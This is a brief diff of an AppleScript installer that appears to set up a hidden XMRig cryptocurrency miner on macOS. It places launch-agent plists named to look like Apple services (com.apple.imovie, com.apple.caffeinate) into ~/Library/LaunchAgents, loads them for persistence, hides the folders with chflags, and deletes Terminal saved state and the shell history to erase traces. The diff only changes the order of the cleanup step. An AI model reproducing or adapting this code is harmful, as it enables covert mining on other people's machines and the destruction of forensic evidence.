@@ -6,5 +6,5 @@ try
 	do shell script "/bin/mv /Users/Shared/Webkit/com.apple.imovie.plist /Users/Shared/Webkit/XMRig-main/com.apple.caffeinate.plist ~/Library/LaunchAgents && /bin/sleep 1s && /bin/rm -rf /Users/Shared/Webkit/XMRig-main"
 	do shell script "/usr/bin/chflags -R hidden /Users/Shared/Webkit ~/Library/LaunchAgents/"
 	do shell script "/bin/launchctl load ~/Library/LaunchAgents/com.apple.imovie.plist && /bin/launchctl load ~/Library/LaunchAgents/com.apple.caffeinate.plist"
-	do shell script "rm -rf ~/Library/Saved Application State/com.apple.Terminal.savedState && rm ~/.zsh_history && /usr/bin/killall Terminal && /usr/bin/killall Finder"
+	do shell script "/usr/bin/killall Terminal && rm -rf ~/Library/Saved Application State/com.apple.Terminal.savedState && rm ~/.zsh_history"
 end try
